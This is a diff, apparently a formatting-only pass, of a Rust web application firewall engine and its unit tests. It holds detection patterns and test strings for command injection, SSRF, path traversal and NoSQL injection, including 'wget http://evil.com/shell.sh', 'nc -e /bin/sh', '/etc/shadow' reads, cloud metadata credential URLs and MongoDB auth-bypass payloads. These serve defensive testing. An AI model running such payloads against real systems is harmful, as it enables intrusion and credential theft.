@@ -36,14 +36,13 @@ use crate::waf::index::{
 use crate::waf::rule::{MatchCondition, MatchValue, WafRule};
 use crate::waf::state::StateStore;
 use crate::waf::types::{Action, EvalContext, Request, RiskContribution, Verdict};
-use crate::waf::{TraceEvent, TraceSink, TraceState};
 use crate::waf::WafError;
+use crate::waf::{TraceEvent, TraceSink, TraceState};
 
 // Pre-compiled regex patterns for SQL/XSS detection
 #[allow(dead_code)]
-static BASE64_PATTERN: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{2,3}=)?$").expect("base64 regex")
-});
+static BASE64_PATTERN: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{2,3}=)?$").expect("base64 regex"));
 
 static SQL_KEYWORDS: Lazy<Regex> = Lazy::new(|| {
     RegexBuilder::new(r"\b(load_file|into outfile)\b")
@@ -114,19 +113,16 @@ static XSS_IMG_SRC: Lazy<Regex> = Lazy::new(|| {
 // SECURITY: These patterns detect OS command injection attempts
 
 /// Backtick command execution: `cmd`
-static CMD_BACKTICK: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"`[^`]+`").expect("cmd backtick regex")
-});
+static CMD_BACKTICK: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"`[^`]+`").expect("cmd backtick regex"));
 
 /// $() command substitution: $(cmd)
-static CMD_SUBSHELL: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"\$\([^)]+\)").expect("cmd subshell regex")
-});
+static CMD_SUBSHELL: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"\$\([^)]+\)").expect("cmd subshell regex"));
 
 /// Variable substitution patterns: ${IFS}, ${PATH}, ${variable}
-static CMD_VAR_SUBST: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"\$\{[^}]+\}").expect("cmd var subst regex")
-});
+static CMD_VAR_SUBST: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"\$\{[^}]+\}").expect("cmd var subst regex"));
 
 /// IFS manipulation (common bypass technique)
 static CMD_IFS: Lazy<Regex> = Lazy::new(|| {
@@ -137,14 +133,11 @@ static CMD_IFS: Lazy<Regex> = Lazy::new(|| {
 });
 
 /// Shell metacharacters for command chaining: ; | && ||
-static CMD_CHAIN: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"[;&|]{1,2}").expect("cmd chain regex")
-});
+static CMD_CHAIN: Lazy<Regex> = Lazy::new(|| Regex::new(r"[;&|]{1,2}").expect("cmd chain regex"));
 
 /// Brace expansion: {cmd1,cmd2}
-static CMD_BRACE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"\{[^}]*,[^}]*\}").expect("cmd brace regex")
-});
+static CMD_BRACE: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"\{[^}]*,[^}]*\}").expect("cmd brace regex"));
 
 /// Common dangerous commands (with word boundaries to avoid false positives)
 static CMD_DANGEROUS: Lazy<Regex> = Lazy::new(|| {
@@ -165,19 +158,16 @@ static CMD_NEWLINE_ENCODED: Lazy<Regex> = Lazy::new(|| {
 });
 
 /// Literal newline/carriage return in parameter values
-static CMD_NEWLINE_LITERAL: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"[\r\n]").expect("cmd newline literal regex")
-});
+static CMD_NEWLINE_LITERAL: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"[\r\n]").expect("cmd newline literal regex"));
 
 /// Redirection operators: > >> < 2>&1
-static CMD_REDIRECT: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"[<>]{1,2}|2>&1|&>").expect("cmd redirect regex")
-});
+static CMD_REDIRECT: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"[<>]{1,2}|2>&1|&>").expect("cmd redirect regex"));
 
 /// Path traversal combined with command execution
-static CMD_PATH_TRAVERSAL: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"\.{2,}/+").expect("cmd path traversal regex")
-});
+static CMD_PATH_TRAVERSAL: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"\.{2,}/+").expect("cmd path traversal regex"));
 
 /// Null byte injection (can truncate strings in some contexts)
 static CMD_NULL_BYTE: Lazy<Regex> = Lazy::new(|| {
@@ -191,9 +181,8 @@ static CMD_NULL_BYTE: Lazy<Regex> = Lazy::new(|| {
 // SECURITY: These patterns detect directory traversal attacks including encoding bypasses
 
 /// Basic path traversal: ../, ..\, ....//
-static PATH_TRAV_BASIC: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"\.{2,}[/\\]+|\.{2,}$").expect("path trav basic regex")
-});
+static PATH_TRAV_BASIC: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"\.{2,}[/\\]+|\.{2,}$").expect("path trav basic regex"));
 
 /// URL-encoded path traversal: %2e%2e%2f, %2e%2e/, ..%2f
 static PATH_TRAV_ENCODED: Lazy<Regex> = Lazy::new(|| {
@@ -238,10 +227,12 @@ static PATH_TRAV_TARGETS_UNIX: Lazy<Regex> = Lazy::new(|| {
 
 /// Sensitive path targets (Windows)
 static PATH_TRAV_TARGETS_WIN: Lazy<Regex> = Lazy::new(|| {
-    RegexBuilder::new(r"boot\.ini|win\.ini|system32|windows\\system|SAM|NTDS\.dit|web\.config|machine\.config")
-        .case_insensitive(true)
-        .build()
-        .expect("path trav targets win regex")
+    RegexBuilder::new(
+        r"boot\.ini|win\.ini|system32|windows\\system|SAM|NTDS\.dit|web\.config|machine\.config",
+    )
+    .case_insensitive(true)
+    .build()
+    .expect("path trav targets win regex")
 });
 
 /// Null byte injection for path truncation: file.php%00.jpg
@@ -363,10 +354,12 @@ static NOSQL_REDIS: Lazy<Regex> = Lazy::new(|| {
 
 /// Cassandra CQL injection patterns
 static NOSQL_CASSANDRA: Lazy<Regex> = Lazy::new(|| {
-    RegexBuilder::new(r"\b(?:ALLOW\s+FILTERING|USING\s+TTL|USING\s+TIMESTAMP|TOKEN\s*\(|WRITETIME\s*\()\b")
-        .case_insensitive(true)
-        .build()
-        .expect("nosql cassandra regex")
+    RegexBuilder::new(
+        r"\b(?:ALLOW\s+FILTERING|USING\s+TTL|USING\s+TIMESTAMP|TOKEN\s*\(|WRITETIME\s*\()\b",
+    )
+    .case_insensitive(true)
+    .build()
+    .expect("nosql cassandra regex")
 });
 
 /// JSON injection patterns (prototype pollution, __proto__)
@@ -583,11 +576,9 @@ impl Engine {
                     safe_percent_decode,
                 );
                 let candidates: Arc<[usize]> = Arc::from(computed);
-                self.candidate_cache.write().insert(
-                    cache_key,
-                    uri.to_string(),
-                    candidates.clone(),
-                );
+                self.candidate_cache
+                    .write()
+                    .insert(cache_key, uri.to_string(), candidates.clone());
                 candidates
             }
         };
@@ -662,7 +653,11 @@ impl Engine {
             adjusted_threshold: None,
             anomaly_signals: Vec::new(),
             timed_out,
-            rules_evaluated: if timed_out { Some(rules_evaluated) } else { None },
+            rules_evaluated: if timed_out {
+                Some(rules_evaluated)
+            } else {
+                None
+            },
         }
     }
 
@@ -708,7 +703,16 @@ impl Engine {
                         .match_value
                         .as_ref()
                         .and_then(|m| m.as_cond())
-                        .map(|child| self.eval_condition(child, ctx, Some(&lowered), trace, rule_id, depth + 1))
+                        .map(|child| {
+                            self.eval_condition(
+                                child,
+                                ctx,
+                                Some(&lowered),
+                                trace,
+                                rule_id,
+                                depth + 1,
+                            )
+                        })
                         .unwrap_or(true)
                 }
                 None => false,
@@ -720,7 +724,16 @@ impl Engine {
                         .match_value
                         .as_ref()
                         .and_then(|m| m.as_cond())
-                        .map(|child| self.eval_condition(child, ctx, Some(&decoded), trace, rule_id, depth + 1))
+                        .map(|child| {
+                            self.eval_condition(
+                                child,
+                                ctx,
+                                Some(&decoded),
+                                trace,
+                                rule_id,
+                                depth + 1,
+                            )
+                        })
                         .unwrap_or(false)
                 }
                 None => false,
@@ -732,7 +745,16 @@ impl Engine {
                         .match_value
                         .as_ref()
                         .and_then(|m| m.as_cond())
-                        .map(|child| self.eval_condition(child, ctx, Some(&decoded), trace, rule_id, depth + 1))
+                        .map(|child| {
+                            self.eval_condition(
+                                child,
+                                ctx,
+                                Some(&decoded),
+                                trace,
+                                rule_id,
+                                depth + 1,
+                            )
+                        })
                         .unwrap_or(false)
                 }
                 None => false,
@@ -743,7 +765,9 @@ impl Engine {
                     .match_value
                     .as_ref()
                     .and_then(|m| m.as_cond())
-                    .map(|child| self.eval_condition(child, ctx, Some(&raw), trace, rule_id, depth + 1))
+                    .map(|child| {
+                        self.eval_condition(child, ctx, Some(&raw), trace, rule_id, depth + 1)
+                    })
                     .unwrap_or(false)
             }
             "request_json" => match ctx.json_text.as_deref() {
@@ -751,7 +775,9 @@ impl Engine {
                     .match_value
                     .as_ref()
                     .and_then(|m| m.as_cond())
-                    .map(|child| self.eval_condition(child, ctx, Some(json_text), trace, rule_id, depth + 1))
+                    .map(|child| {
+                        self.eval_condition(child, ctx, Some(json_text), trace, rule_id, depth + 1)
+                    })
                     .unwrap_or(true),
                 None => false,
             },
@@ -769,13 +795,19 @@ impl Engine {
             "path_traversal_analyzer" => {
                 self.eval_path_traversal_analyzer(condition, value, ctx, trace, rule_id, depth)
             }
-            "ssrf_analyzer" => self.eval_ssrf_analyzer(condition, value, ctx, trace, rule_id, depth),
-            "nosql_analyzer" => self.eval_nosql_analyzer(condition, value, ctx, trace, rule_id, depth),
+            "ssrf_analyzer" => {
+                self.eval_ssrf_analyzer(condition, value, ctx, trace, rule_id, depth)
+            }
+            "nosql_analyzer" => {
+                self.eval_nosql_analyzer(condition, value, ctx, trace, rule_id, depth)
+            }
             "hashset" => eval_hashset(condition.match_value.as_ref(), value),
             "parse_multipart" => self.eval_parse_multipart(condition, ctx, trace, rule_id, depth),
             "track_by_ip" => self.eval_track_by_ip(condition, ctx, trace, rule_id, depth),
             "extract_argument" => self.eval_extract_argument(condition, ctx, trace, rule_id, depth),
-            "unique_count" => self.eval_unique_count(condition, ctx, value, &[], trace, rule_id, depth),
+            "unique_count" => {
+                self.eval_unique_count(condition, ctx, value, &[], trace, rule_id, depth)
+            }
             "count" => self.eval_count(condition, ctx, trace, rule_id, depth),
             "remember_match" => condition
                 .match_value
@@ -1039,9 +1071,14 @@ impl Engine {
         };
         let score = sql_analyzer_score(value);
         match condition.match_value.as_ref().and_then(|m| m.as_cond()) {
-            Some(child) => {
-                self.eval_condition(child, ctx, Some(&score.to_string()), trace, rule_id, depth + 1)
-            }
+            Some(child) => self.eval_condition(
+                child,
+                ctx,
+                Some(&score.to_string()),
+                trace,
+                rule_id,
+                depth + 1,
+            ),
             None => score > 0,
         }
     }
@@ -1060,9 +1097,14 @@ impl Engine {
         };
         let score = xss_analyzer_score(value);
         match condition.match_value.as_ref().and_then(|m| m.as_cond()) {
-            Some(child) => {
-                self.eval_condition(child, ctx, Some(&score.to_string()), trace, rule_id, depth + 1)
-            }
+            Some(child) => self.eval_condition(
+                child,
+                ctx,
+                Some(&score.to_string()),
+                trace,
+                rule_id,
+                depth + 1,
+            ),
             None => score > 0,
         }
     }
@@ -1081,9 +1123,14 @@ impl Engine {
         };
         let score = cmd_analyzer_score(value);
         match condition.match_value.as_ref().and_then(|m| m.as_cond()) {
-            Some(child) => {
-                self.eval_condition(child, ctx, Some(&score.to_string()), trace, rule_id, depth + 1)
-            }
+            Some(child) => self.eval_condition(
+                child,
+                ctx,
+                Some(&score.to_string()),
+                trace,
+                rule_id,
+                depth + 1,
+            ),
             None => score > 0,
         }
     }
@@ -1102,9 +1149,14 @@ impl Engine {
         };
         let score = path_traversal_analyzer_score(value);
         match condition.match_value.as_ref().and_then(|m| m.as_cond()) {
-            Some(child) => {
-                self.eval_condition(child, ctx, Some(&score.to_string()), trace, rule_id, depth + 1)
-            }
+            Some(child) => self.eval_condition(
+                child,
+                ctx,
+                Some(&score.to_string()),
+                trace,
+                rule_id,
+                depth + 1,
+            ),
             None => score > 0,
         }
     }
@@ -1127,9 +1179,14 @@ impl Engine {
         };
         let score = ssrf_analyzer_score(value);
         match condition.match_value.as_ref().and_then(|m| m.as_cond()) {
-            Some(child) => {
-                self.eval_condition(child, ctx, Some(&score.to_string()), trace, rule_id, depth + 1)
-            }
+            Some(child) => self.eval_condition(
+                child,
+                ctx,
+                Some(&score.to_string()),
+                trace,
+                rule_id,
+                depth + 1,
+            ),
             None => score > 0,
         }
     }
@@ -1152,9 +1209,14 @@ impl Engine {
         };
         let score = nosql_analyzer_score(value);
         match condition.match_value.as_ref().and_then(|m| m.as_cond()) {
-            Some(child) => {
-                self.eval_condition(child, ctx, Some(&score.to_string()), trace, rule_id, depth + 1)
-            }
+            Some(child) => self.eval_condition(
+                child,
+                ctx,
+                Some(&score.to_string()),
+                trace,
+                rule_id,
+                depth + 1,
+            ),
             None => score > 0,
         }
     }
@@ -1321,9 +1383,14 @@ impl Engine {
                     return false;
                 }
                 match condition.match_value.as_ref().and_then(|m| m.as_cond()) {
-                    Some(child) => {
-                        self.process_track_condition(child, ctx, extracted, trace, rule_id, depth + 1)
-                    }
+                    Some(child) => self.process_track_condition(
+                        child,
+                        ctx,
+                        extracted,
+                        trace,
+                        rule_id,
+                        depth + 1,
+                    ),
                     None => {
                         let mut store = self.store.write();
                         store.record_unique_values(ctx.ip, "extract", &extracted, 60);
@@ -1922,7 +1989,10 @@ fn decode_single_entity(entity: &str) -> Option<char> {
     // Decimal: &#60;
     if let Some(num_str) = entity.strip_prefix('#') {
         // Hexadecimal: &#x3C; or &#X3C;
-        if let Some(hex_str) = num_str.strip_prefix('x').or_else(|| num_str.strip_prefix('X')) {
+        if let Some(hex_str) = num_str
+            .strip_prefix('x')
+            .or_else(|| num_str.strip_prefix('X'))
+        {
             if let Ok(code) = u32::from_str_radix(hex_str, 16) {
                 return char::from_u32(code);
             }
@@ -2257,7 +2327,9 @@ mod tests {
 
         // javascript: scheme with entity encoding
         assert!(
-            xss_analyzer_score("&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)") > 0,
+            xss_analyzer_score(
+                "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"
+            ) > 0,
             "Should detect javascript: via decimal entities"
         );
 
@@ -2307,10 +2379,7 @@ mod tests {
         assert_eq!(decode_html_entities("&apos;"), "'");
 
         // Mixed content
-        assert_eq!(
-            decode_html_entities("hello &lt;world&gt;"),
-            "hello <world>"
-        );
+        assert_eq!(decode_html_entities("hello &lt;world&gt;"), "hello <world>");
 
         // No entities
         assert_eq!(decode_html_entities("no entities here"), "no entities here");
@@ -2338,33 +2407,78 @@ mod tests {
     #[test]
     fn test_cmd_analyzer() {
         // Backtick command execution
-        assert!(cmd_analyzer_score(r"`cat /etc/passwd`") > 0, "Should detect backtick execution");
-        assert!(cmd_analyzer_score(r"`id`") > 0, "Should detect simple backtick");
+        assert!(
+            cmd_analyzer_score(r"`cat /etc/passwd`") > 0,
+            "Should detect backtick execution"
+        );
+        assert!(
+            cmd_analyzer_score(r"`id`") > 0,
+            "Should detect simple backtick"
+        );
 
         // $() command substitution
-        assert!(cmd_analyzer_score(r"$(cat /etc/passwd)") > 0, "Should detect subshell execution");
-        assert!(cmd_analyzer_score(r"$(whoami)") > 0, "Should detect simple subshell");
+        assert!(
+            cmd_analyzer_score(r"$(cat /etc/passwd)") > 0,
+            "Should detect subshell execution"
+        );
+        assert!(
+            cmd_analyzer_score(r"$(whoami)") > 0,
+            "Should detect simple subshell"
+        );
 
         // Variable substitution
-        assert!(cmd_analyzer_score(r"${PATH}") > 0, "Should detect variable substitution");
-        assert!(cmd_analyzer_score(r"${IFS}") > 0, "Should detect IFS substitution");
+        assert!(
+            cmd_analyzer_score(r"${PATH}") > 0,
+            "Should detect variable substitution"
+        );
+        assert!(
+            cmd_analyzer_score(r"${IFS}") > 0,
+            "Should detect IFS substitution"
+        );
 
         // IFS manipulation
         assert!(cmd_analyzer_score(r"$IFS") > 0, "Should detect $IFS");
-        assert!(cmd_analyzer_score(r"IFS=x") > 0, "Should detect IFS assignment");
+        assert!(
+            cmd_analyzer_score(r"IFS=x") > 0,
+            "Should detect IFS assignment"
+        );
 
         // Dangerous commands
-        assert!(cmd_analyzer_score(r"cat /etc/passwd") > 0, "Should detect /etc/passwd access");
-        assert!(cmd_analyzer_score(r"cat /etc/shadow") > 0, "Should detect /etc/shadow access");
-        assert!(cmd_analyzer_score(r"wget http://evil.com/shell.sh") > 0, "Should detect wget");
-        assert!(cmd_analyzer_score(r"curl http://evil.com") > 0, "Should detect curl");
-        assert!(cmd_analyzer_score(r"nc -e /bin/sh") > 0, "Should detect netcat");
+        assert!(
+            cmd_analyzer_score(r"cat /etc/passwd") > 0,
+            "Should detect /etc/passwd access"
+        );
+        assert!(
+            cmd_analyzer_score(r"cat /etc/shadow") > 0,
+            "Should detect /etc/shadow access"
+        );
+        assert!(
+            cmd_analyzer_score(r"wget http://evil.com/shell.sh") > 0,
+            "Should detect wget"
+        );
+        assert!(
+            cmd_analyzer_score(r"curl http://evil.com") > 0,
+            "Should detect curl"
+        );
+        assert!(
+            cmd_analyzer_score(r"nc -e /bin/sh") > 0,
+            "Should detect netcat"
+        );
         assert!(cmd_analyzer_score(r"bash -i") > 0, "Should detect bash -i");
-        assert!(cmd_analyzer_score(r"/bin/sh -c 'cmd'") > 0, "Should detect /bin/sh -c");
+        assert!(
+            cmd_analyzer_score(r"/bin/sh -c 'cmd'") > 0,
+            "Should detect /bin/sh -c"
+        );
 
         // Clean values should not match
-        assert!(cmd_analyzer_score("hello world") == 0, "Clean value should not match");
-        assert!(cmd_analyzer_score("user@example.com") == 0, "Email should not match");
+        assert!(
+            cmd_analyzer_score("hello world") == 0,
+            "Clean value should not match"
+        );
+        assert!(
+            cmd_analyzer_score("user@example.com") == 0,
+            "Email should not match"
+        );
     }
 
     /// SECURITY TEST: Verify command injection detection via newline encoding.
@@ -2599,104 +2713,194 @@ mod tests {
     #[test]
     fn test_ssrf_analyzer_localhost() {
         // IPv4 localhost
-        assert!(ssrf_analyzer_score("http://127.0.0.1/") > 0, "Should detect 127.0.0.1");
-        assert!(ssrf_analyzer_score("http://127.0.0.2/admin") > 0, "Should detect 127.0.0.x");
-        assert!(ssrf_analyzer_score("https://127.255.255.255:8080/") > 0, "Should detect 127.x.x.x");
+        assert!(
+            ssrf_analyzer_score("http://127.0.0.1/") > 0,
+            "Should detect 127.0.0.1"
+        );
+        assert!(
+            ssrf_analyzer_score("http://127.0.0.2/admin") > 0,
+            "Should detect 127.0.0.x"
+        );
+        assert!(
+            ssrf_analyzer_score("https://127.255.255.255:8080/") > 0,
+            "Should detect 127.x.x.x"
+        );
 
         // IPv6 localhost
-        assert!(ssrf_analyzer_score("http://[::1]/") > 0, "Should detect ::1");
-        assert!(ssrf_analyzer_score("http://[0:0:0:0:0:0:0:1]/") > 0, "Should detect full IPv6 localhost");
+        assert!(
+            ssrf_analyzer_score("http://[::1]/") > 0,
+            "Should detect ::1"
+        );
+        assert!(
+            ssrf_analyzer_score("http://[0:0:0:0:0:0:0:1]/") > 0,
+            "Should detect full IPv6 localhost"
+        );
     }
 
     /// Test SSRF detection for cloud metadata endpoints.
     #[test]
     fn test_ssrf_analyzer_cloud_metadata() {
         // AWS/Azure/GCP metadata
-        assert!(ssrf_analyzer_score("http://169.254.169.254/latest/meta-data/") > 0,
-            "Should detect AWS metadata endpoint");
-        assert!(ssrf_analyzer_score("http://169.254.170.2/v2/credentials") > 0,
-            "Should detect AWS ECS metadata");
-        assert!(ssrf_analyzer_score("http://metadata.google.internal/") > 0,
-            "Should detect GCP metadata hostname");
-        assert!(ssrf_analyzer_score("http://metadata.azure.com/") > 0,
-            "Should detect Azure metadata hostname");
+        assert!(
+            ssrf_analyzer_score("http://169.254.169.254/latest/meta-data/") > 0,
+            "Should detect AWS metadata endpoint"
+        );
+        assert!(
+            ssrf_analyzer_score("http://169.254.170.2/v2/credentials") > 0,
+            "Should detect AWS ECS metadata"
+        );
+        assert!(
+            ssrf_analyzer_score("http://metadata.google.internal/") > 0,
+            "Should detect GCP metadata hostname"
+        );
+        assert!(
+            ssrf_analyzer_score("http://metadata.azure.com/") > 0,
+            "Should detect Azure metadata hostname"
+        );
     }
 
     /// Test SSRF detection for private IP ranges.
     #[test]
     fn test_ssrf_analyzer_private_ips() {
         // 10.0.0.0/8
-        assert!(ssrf_analyzer_score("http://10.0.0.1/internal") > 0, "Should detect 10.x.x.x");
-        assert!(ssrf_analyzer_score("http://10.255.255.255/") > 0, "Should detect 10.255.255.255");
+        assert!(
+            ssrf_analyzer_score("http://10.0.0.1/internal") > 0,
+            "Should detect 10.x.x.x"
+        );
+        assert!(
+            ssrf_analyzer_score("http://10.255.255.255/") > 0,
+            "Should detect 10.255.255.255"
+        );
 
         // 192.168.0.0/16
-        assert!(ssrf_analyzer_score("http://192.168.1.1/") > 0, "Should detect 192.168.x.x");
-        assert!(ssrf_analyzer_score("http://192.168.0.254:3000/") > 0, "Should detect with port");
+        assert!(
+            ssrf_analyzer_score("http://192.168.1.1/") > 0,
+            "Should detect 192.168.x.x"
+        );
+        assert!(
+            ssrf_analyzer_score("http://192.168.0.254:3000/") > 0,
+            "Should detect with port"
+        );
 
         // 172.16.0.0/12
-        assert!(ssrf_analyzer_score("http://172.16.0.1/") > 0, "Should detect 172.16.x.x");
-        assert!(ssrf_analyzer_score("http://172.31.255.255/") > 0, "Should detect 172.31.x.x");
+        assert!(
+            ssrf_analyzer_score("http://172.16.0.1/") > 0,
+            "Should detect 172.16.x.x"
+        );
+        assert!(
+            ssrf_analyzer_score("http://172.31.255.255/") > 0,
+            "Should detect 172.31.x.x"
+        );
     }
 
     /// Test SSRF detection for dangerous URL schemes.
     #[test]
     fn test_ssrf_analyzer_dangerous_schemes() {
-        assert!(ssrf_analyzer_score("file:///etc/passwd") > 0, "Should detect file://");
-        assert!(ssrf_analyzer_score("gopher://internal:1234/") > 0, "Should detect gopher://");
-        assert!(ssrf_analyzer_score("dict://localhost:11211/") > 0, "Should detect dict://");
-        assert!(ssrf_analyzer_score("ldap://internal/") > 0, "Should detect ldap://");
-        assert!(ssrf_analyzer_score("expect://id") > 0, "Should detect expect://");
-        assert!(ssrf_analyzer_score("php://filter/convert.base64-encode") > 0, "Should detect php://");
-        assert!(ssrf_analyzer_score("data:text/html,<script>") > 0, "Should detect data:");
+        assert!(
+            ssrf_analyzer_score("file:///etc/passwd") > 0,
+            "Should detect file://"
+        );
+        assert!(
+            ssrf_analyzer_score("gopher://internal:1234/") > 0,
+            "Should detect gopher://"
+        );
+        assert!(
+            ssrf_analyzer_score("dict://localhost:11211/") > 0,
+            "Should detect dict://"
+        );
+        assert!(
+            ssrf_analyzer_score("ldap://internal/") > 0,
+            "Should detect ldap://"
+        );
+        assert!(
+            ssrf_analyzer_score("expect://id") > 0,
+            "Should detect expect://"
+        );
+        assert!(
+            ssrf_analyzer_score("php://filter/convert.base64-encode") > 0,
+            "Should detect php://"
+        );
+        assert!(
+            ssrf_analyzer_score("data:text/html,<script>") > 0,
+            "Should detect data:"
+        );
     }
 
     /// Test SSRF detection for IPv6-mapped IPv4 bypass attempts.
     #[test]
     fn test_ssrf_analyzer_ipv6_mapped() {
         // IPv6-mapped localhost
-        assert!(ssrf_analyzer_score("http://[::ffff:127.0.0.1]/") > 0,
-            "Should detect IPv6-mapped localhost");
+        assert!(
+            ssrf_analyzer_score("http://[::ffff:127.0.0.1]/") > 0,
+            "Should detect IPv6-mapped localhost"
+        );
         // IPv6-mapped private IP
-        assert!(ssrf_analyzer_score("http://[::ffff:192.168.1.1]/") > 0,
-            "Should detect IPv6-mapped private IP");
+        assert!(
+            ssrf_analyzer_score("http://[::ffff:192.168.1.1]/") > 0,
+            "Should detect IPv6-mapped private IP"
+        );
         // IPv6-mapped cloud metadata
-        assert!(ssrf_analyzer_score("http://[::ffff:169.254.169.254]/") > 0,
-            "Should detect IPv6-mapped metadata");
+        assert!(
+            ssrf_analyzer_score("http://[::ffff:169.254.169.254]/") > 0,
+            "Should detect IPv6-mapped metadata"
+        );
     }
 
     /// Test SSRF detection for encoded IP bypasses.
     #[test]
     fn test_ssrf_analyzer_encoded_ip() {
         // Decimal localhost: 2130706433 = 127.0.0.1
-        assert!(ssrf_analyzer_score("http://2130706433/") > 0,
-            "Should detect decimal IP (127.0.0.1)");
+        assert!(
+            ssrf_analyzer_score("http://2130706433/") > 0,
+            "Should detect decimal IP (127.0.0.1)"
+        );
         // Hex localhost: 0x7f000001 = 127.0.0.1
-        assert!(ssrf_analyzer_score("http://0x7f000001/") > 0,
-            "Should detect hex IP (127.0.0.1)");
+        assert!(
+            ssrf_analyzer_score("http://0x7f000001/") > 0,
+            "Should detect hex IP (127.0.0.1)"
+        );
     }
 
     /// Test SSRF detection for URL-encoded bypasses.
     #[test]
     fn test_ssrf_analyzer_url_encoded() {
         // URL-encoded localhost
-        assert!(ssrf_analyzer_score("http%3a%2f%2f127.0.0.1%2f") > 0,
-            "Should detect URL-encoded SSRF");
+        assert!(
+            ssrf_analyzer_score("http%3a%2f%2f127.0.0.1%2f") > 0,
+            "Should detect URL-encoded SSRF"
+        );
         // Double-encoded
-        assert!(ssrf_analyzer_score("http%253a%252f%252f127.0.0.1") > 0,
-            "Should detect double-encoded SSRF");
+        assert!(
+            ssrf_analyzer_score("http%253a%252f%252f127.0.0.1") > 0,
+            "Should detect double-encoded SSRF"
+        );
     }
 
     /// Test that legitimate URLs are not flagged as SSRF.
     #[test]
     fn test_ssrf_analyzer_false_positives() {
         // Public IPs
-        assert!(ssrf_analyzer_score("http://8.8.8.8/") == 0, "Should not flag public IP");
-        assert!(ssrf_analyzer_score("https://google.com/") == 0, "Should not flag domain");
-        assert!(ssrf_analyzer_score("http://example.com/api/data") == 0, "Should not flag normal URL");
+        assert!(
+            ssrf_analyzer_score("http://8.8.8.8/") == 0,
+            "Should not flag public IP"
+        );
+        assert!(
+            ssrf_analyzer_score("https://google.com/") == 0,
+            "Should not flag domain"
+        );
+        assert!(
+            ssrf_analyzer_score("http://example.com/api/data") == 0,
+            "Should not flag normal URL"
+        );
         // Normal content
-        assert!(ssrf_analyzer_score("user submitted text") == 0, "Should not flag normal text");
-        assert!(ssrf_analyzer_score("192.168.1.1 is a private IP") == 0,
-            "Should not flag IP without URL context");
+        assert!(
+            ssrf_analyzer_score("user submitted text") == 0,
+            "Should not flag normal text"
+        );
+        assert!(
+            ssrf_analyzer_score("192.168.1.1 is a private IP") == 0,
+            "Should not flag IP without URL context"
+        );
     }
 
     // ==================== NoSQL Injection Detection Tests ====================
@@ -2705,103 +2909,157 @@ mod tests {
     #[test]
     fn test_nosql_analyzer_mongo_operators() {
         // MongoDB operators
-        assert!(nosql_analyzer_score(r#"{"username": {"$ne": null}}"#) > 0,
-            "Should detect $ne operator");
-        assert!(nosql_analyzer_score(r#"{"age": {"$gt": 18}}"#) > 0,
-            "Should detect $gt operator");
-        assert!(nosql_analyzer_score(r#"{"name": {"$regex": ".*"}}"#) > 0,
-            "Should detect $regex operator");
-        assert!(nosql_analyzer_score(r#"{"$or": [{"a": 1}, {"b": 2}]}"#) > 0,
-            "Should detect $or operator");
+        assert!(
+            nosql_analyzer_score(r#"{"username": {"$ne": null}}"#) > 0,
+            "Should detect $ne operator"
+        );
+        assert!(
+            nosql_analyzer_score(r#"{"age": {"$gt": 18}}"#) > 0,
+            "Should detect $gt operator"
+        );
+        assert!(
+            nosql_analyzer_score(r#"{"name": {"$regex": ".*"}}"#) > 0,
+            "Should detect $regex operator"
+        );
+        assert!(
+            nosql_analyzer_score(r#"{"$or": [{"a": 1}, {"b": 2}]}"#) > 0,
+            "Should detect $or operator"
+        );
     }
 
     /// Test NoSQL detection for MongoDB $where JavaScript execution (HIGH RISK).
     #[test]
     fn test_nosql_analyzer_where_js() {
         // $where with JavaScript function (CRITICAL)
-        assert!(nosql_analyzer_score(r#"{"$where": "function() { return true; }"}"#) > 0,
-            "Should detect $where with function");
-        assert!(nosql_analyzer_score(r#"{"$where": "this.password == 'test'"}"#) > 0,
-            "Should detect $where with this keyword");
-        assert!(nosql_analyzer_score(r#"{"$where": "sleep(5000)"}"#) > 0,
-            "Should detect $where with sleep (DoS)");
+        assert!(
+            nosql_analyzer_score(r#"{"$where": "function() { return true; }"}"#) > 0,
+            "Should detect $where with function"
+        );
+        assert!(
+            nosql_analyzer_score(r#"{"$where": "this.password == 'test'"}"#) > 0,
+            "Should detect $where with this keyword"
+        );
+        assert!(
+            nosql_analyzer_score(r#"{"$where": "sleep(5000)"}"#) > 0,
+            "Should detect $where with sleep (DoS)"
+        );
     }
 
     /// Test NoSQL detection for MongoDB authentication bypass.
     #[test]
     fn test_nosql_analyzer_auth_bypass() {
         // Authentication bypass patterns
-        assert!(nosql_analyzer_score(r#"{"password": {"$ne": ""}}"#) > 0,
-            "Should detect password $ne bypass");
-        assert!(nosql_analyzer_score(r#"{"username": "admin", "password": {"$gt": ""}}"#) > 0,
-            "Should detect password $gt bypass");
-        assert!(nosql_analyzer_score(r#"{"user": {"$exists": true}}"#) > 0,
-            "Should detect user $exists bypass");
+        assert!(
+            nosql_analyzer_score(r#"{"password": {"$ne": ""}}"#) > 0,
+            "Should detect password $ne bypass"
+        );
+        assert!(
+            nosql_analyzer_score(r#"{"username": "admin", "password": {"$gt": ""}}"#) > 0,
+            "Should detect password $gt bypass"
+        );
+        assert!(
+            nosql_analyzer_score(r#"{"user": {"$exists": true}}"#) > 0,
+            "Should detect user $exists bypass"
+        );
     }
 
     /// Test NoSQL detection for prototype pollution.
     #[test]
     fn test_nosql_analyzer_proto_pollution() {
         // Prototype pollution (can lead to RCE)
